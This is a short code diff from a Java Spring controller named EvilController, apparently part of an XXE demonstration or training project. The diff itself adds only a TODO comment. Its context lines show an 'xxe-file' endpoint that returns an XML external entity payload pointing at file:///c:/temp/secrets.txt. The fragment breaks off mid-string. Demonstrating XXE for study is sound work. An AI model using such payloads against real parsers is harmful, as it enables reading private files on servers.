@@ -12,6 +12,7 @@ import java.util.Date;
 @RequestMapping("evil")
 public class EvilController {
 
+    //TODO: do example for *nix and win
     @GetMapping("xxe-file")
     public String payload() {
         return "<!ENTITY % payload SYSTEM \"file:///c:/temp/secrets.txt\">\n" +
